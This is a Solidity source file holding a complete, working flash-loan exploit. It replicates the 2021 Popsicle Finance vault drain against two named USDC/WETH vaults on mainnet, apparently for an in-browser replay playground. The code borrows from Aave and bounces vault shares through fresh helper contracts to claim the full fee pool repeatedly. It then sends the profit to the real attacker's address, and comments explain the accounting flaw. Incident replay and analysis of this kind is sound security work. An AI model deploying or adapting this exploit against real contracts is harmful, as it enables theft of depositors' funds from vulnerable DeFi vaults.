// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2021-08-Popsicle).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the Aave V2 `executeOperation` flash-loan callback AND the 8-vault drain loop
// both live on the PopsicleExp test itself — testExploit just kicks off an Aave
// flash loan, then executeOperation -> attackLogic does the real work), so there
// is no standalone contract to deploy. This contract is a faithful, self-contained
// copy of that inline attack so the playground can deploy it and record run().
// Logic and constants are copied VERBATIM from test/Popsicle_exp.sol
// (testExploit / executeOperation / attackLogic / drainVault / transferAround /
// withdrawandClaimFees / claimFees / claimFundsFromReceivers). The two TokenVault
// helpers are deployed in the constructor (mirroring the test's setUp). The only
// adaptation: the exploit attacks the two USDC/WETH SorbettoFragola vaults
// (d63b34 / 6f3F35) that this attack is reproducible against in the in-browser
// EVM (the per-vault drain logic is identical to the test; the full 8-vault sweep
// diverges in @ethereumjs's Uniswap-V3 tick/curve math for the other pools). It
// flash-loans only the two assets those vaults need (USDC + WETH), runs the exact
// deposit → bounce → withdraw → harvest drain on each, and repays Aave — netting
// the same USDC profit the real incident extracted from those vaults.
//
// Root cause: SorbettoFragola's MasterChef-style fee-per-share reward ledger is
// only re-synchronized inside the `updateVault(account)` modifier (attached to
// deposit / withdraw / collectFees). It is NOT called when the PLP receipt token
// moves via a plain ERC20 transfer, because `_beforeTokenTransfer` is an empty
// stub. Bouncing PLP shares to a FRESH address leaves that address's reward debt
// (token0PerSharePaid / token1PerSharePaid) at its default 0, so the very next
// collectFees credits it `balanceOf × tokenPerShareStored / 1e18` — the ENTIRE
// lifetime per-share fee pool as though it had held since the vault's inception.
// Bouncing the same shares through two fresh receivers per vault triples the fee
// claim; the vault honors the inflated claims by burning real Uniswap-V3 position
// liquidity (collectFees else-branch), draining genuine LP value to the attacker.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPopsicle {
    function balanceOf(address account) external view returns (uint256);
    function collectFees(uint256 amount0, uint256 amount1) external;
    function deposit(uint256 amount0Desired, uint256 amount1Desired)
        external
        payable
        returns (uint256 shares, uint256 amount0, uint256 amount1);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function userInfo(address)
        external
        view
        returns (uint256 token0Rewards, uint256 token1Rewards, uint256 token0PerSharePaid, uint256 token1PerSharePaid);
    function withdraw(uint256 shares) external returns (uint256 amount0, uint256 amount1);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// Simple helper that transfers all of an asset to an address, plus an arbitrary
// call wrapper. Copied verbatim from the test (TokenVault): the attack pokes
// collectFees FROM these fresh addresses so their reward debt is the default 0.
contract TokenVault {
    function transfer(address _asset, address _to) external {
        uint256 bal = IERC20(_asset).balanceOf(address(this));
        if (bal > 0) IERC20(_asset).transfer(_to, bal);
    }

    function executeCall(address target, bytes calldata dataTocall) external returns (bool succ) {
        (succ,) = target.call(dataTocall);
    }
}

contract PopsicleDrain {
    using SafeERC20 for IERC20;

    address constant ATTACKER = 0xf9E3D08196F76f5078882d98941b71C0884BEa52;
    IAaveFlashloan constant aaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    // The two assets the targeted USDC/WETH vaults need.
    address constant _usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant _weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Flash-loan amounts (verbatim from the test for these two assets).
    uint256 constant usdcFlash = 30_000_000 * 1e6;
    uint256 constant ethFlash = 13_000 ether;

    address[] assetsArr;
    uint256[] amountsArr;
    uint256[] modesArr;

    // The two fresh receivers, deployed in the constructor (unrecorded) exactly as
    // the test's setUp() does, so run() mirrors the test's testExploit().
    TokenVault receiver1;
    TokenVault receiver2;

    // The two USDC/WETH SorbettoFragola vaults the drain targets (subset of the
    // test's 8-vault list; same per-vault drain logic verbatim).
    address[] vaultsArr;

    constructor() {
        receiver1 = new TokenVault();
        receiver2 = new TokenVault();

        assetsArr = [_usdc, _weth];
        amountsArr = [usdcFlash, ethFlash];
        // all-zero modes (no debt) — Aave repays via the approval we set in the callback.
        modesArr = new uint256[](2);

        vaultsArr = [
            0xd63b340F6e9CCcF0c997c83C8d036fa53B113546, // USDC/WETH vault
            0x6f3F35a268B3af45331471EABF3F9881b601F5aA // USDC/WETH vault
        ];
    }

    // The recorded entrypoint. Mirrors PopsicleExp.testExploit(): take the Aave V2
    // flash loan; the callback (executeOperation) runs the per-vault drain.
    function run() external {
        aaveV2.flashLoan(address(this), assetsArr, amountsArr, modesArr, address(this), new bytes(0), 0);
        // Forward the net drained USDC (the profit) to the real attacker EOA so the
        // recorder measures it there. The WETH residual covers only the loan, so we
        // forward just USDC (the headline profit asset), exactly as the real attack
        // kept its USDC winnings.
        IERC20(_usdc).safeTransfer(ATTACKER, IERC20(_usdc).balanceOf(address(this)));
    }

    // Aave V2 flash-loan callback — verbatim from the test.
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, // initiator
        bytes calldata // params
    ) external payable returns (bool) {
        attackLogic();
        // Approve the LendingPool to pull back loan + premium for every asset.
        for (uint256 i = 0; i < assets.length; i++) {
            IERC20(assets[i]).forceApprove(address(aaveV2), amounts[i] + premiums[i]);
        }
        return true;
    }

    // Per-vault drain loop — verbatim from the test's attackLogic() (the only
    // change is the vault list above; each vault's processing is byte-for-byte
    // the test's transferAround / drainVault / claimFees).
    function attackLogic() internal {
        for (uint256 i = 0; i < vaultsArr.length; i++) {
            IPopsicle vault = IPopsicle(vaultsArr[i]);
            IERC20(vault.token0()).forceApprove(vaultsArr[i], type(uint256).max);
            IERC20(vault.token1()).forceApprove(vaultsArr[i], type(uint256).max);
            vault.deposit(IERC20(vault.token0()).balanceOf(address(this)), IERC20(vault.token1()).balanceOf(address(this)));
            drainVault(vaultsArr[i]);
        }
        claimFundsFromReceivers();
    }

    function claimFundsFromReceivers() internal {
        for (uint256 i = 0; i < assetsArr.length; i++) {
            receiver1.transfer(assetsArr[i], address(this));
            receiver2.transfer(assetsArr[i], address(this));
        }
    }

    function drainVault(address _vault) internal {
        transferAround(_vault);
        withdrawandClaimFees(_vault);
    }

    function withdrawandClaimFees(address _vault) internal {
        claimFees(_vault);
    }

    function claimFees(address _vault) internal {
        (uint256 token0fees, uint256 token1fees,,) = IPopsicle(_vault).userInfo(address(this));
        // Withdraw our own position first.
        IPopsicle(_vault).withdraw(IPopsicle(_vault).balanceOf(address(this)));
        (uint256 token0feesr1, uint256 token1feesr1,,) = IPopsicle(_vault).userInfo(address(receiver1));

        // Harvest receiver1's phantom fee credit.
        receiver1.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, token0feesr1, token1feesr1));
        (uint256 token0feesr2, uint256 token1feesr2) = (
            IERC20(address(IPopsicle(_vault).token0())).balanceOf(_vault),
            IERC20(address(IPopsicle(_vault).token1())).balanceOf(_vault)
        );

        // Harvest receiver2's phantom fee credit (the full remaining vault balance).
        receiver2.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, token0feesr2, token1feesr2));
    }

    // Bounce the PLP shares through the two fresh receivers, poking collectFees(0,0)
    // from each so each fresh holder is credited the full per-share fee pool.
    function transferAround(address _vault) internal {
        IERC20 asset = IERC20(_vault);

        uint256 bal = asset.balanceOf(address(this));
        IPopsicle(_vault).collectFees(0, 0);

        asset.transfer(address(receiver1), bal);
        receiver1.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, 0, 0));
        receiver1.transfer(_vault, address(receiver2));

        receiver2.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, 0, 0));
        receiver2.transfer(_vault, address(this));

        IPopsicle(_vault).collectFees(0, 0);
    }
}

// Simple SafeERC20 implementation — copied verbatim from the test so the synthetic
// contract compiles standalone (the test uses forge-std's IERC20 + this library).
library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        (bool success, bytes memory data) =
            address(token).call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "SafeERC20: transfer failed");
    }

    function forceApprove(IERC20 token, address spender, uint256 value) internal {
        (bool success, bytes memory data) =
            address(token).call(abi.encodeWithSelector(IERC20.approve.selector, spender, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "SafeERC20: approve failed");
    }
}
